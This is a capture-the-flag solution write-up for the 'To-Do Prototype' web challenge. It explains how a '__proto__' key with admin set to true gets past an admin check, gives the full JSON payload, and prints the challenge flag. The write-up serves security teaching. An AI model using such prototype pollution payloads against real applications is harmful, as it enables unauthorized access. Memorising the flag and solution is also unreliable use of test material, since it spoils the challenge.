# To-Do Prototype

## Solution

This is a simple prototype pollution web challenge. 

If the player tries to read `/robots.txt` they can see that the `/json` route is disallowed.

If then they navigate to that page they can see a web JSON editor with the contents of the front page as JSON. They can see the various templates there and if they try using the `$FLAG` template, they will see a message warning that only admins can use the `$FLAG` template.

If they try to pass an `admin` property which evaluates to a truthy value, the JSON content is deemed "invalid" and cannot be submitted, at which time they will have to use the `"__proto__"` attribute to pollute the Object prototype. Using such a payload will result in a successful request.

Once that is done, if they go back to the front page they can, once again, use the `$FLAG` template, which will now display the flag.

PS: changing the admin property seems to change text containing the word "admin"

> Flag: `SINFCTF2022{1_h0P3_tH1s_pr0t0TYp3_d03sNT_G3t_P0lLuTED}`

---

Example payload:
```json
{
    "items": [
        {
            "text": "BOAS",
            "checked": false,
            "id": "9bfacfb5-9d7f-4967-baaa-80ce2e854219"
        },
        {
            "text": "Uh oh, you are trying to access the flag, but only *admins* can do it. Better ask for permission...",
            "checked": false,
            "id": "641a0d97-f57a-4e34-bb7c-7b16eecb1323"
        },
        {
            "text": "undefined",
            "checked": false,
            "id": "0ea14bf4-7d5b-46eb-b899-161b5c988fe6"
        }
    ], 
    "__proto__": { 
        "admin": true 
    }
}
```